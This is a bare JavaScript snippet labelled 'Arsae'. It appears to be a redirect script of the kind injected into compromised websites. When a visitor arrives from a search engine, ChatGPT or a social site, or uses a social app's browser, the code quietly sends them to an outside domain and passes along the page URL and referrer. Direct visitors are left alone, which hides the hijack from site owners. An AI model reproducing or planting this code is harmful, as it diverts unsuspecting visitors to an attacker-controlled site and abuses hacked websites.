///// Arsae /////
var ars = 'http://blog.abata1.com';
if(['.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
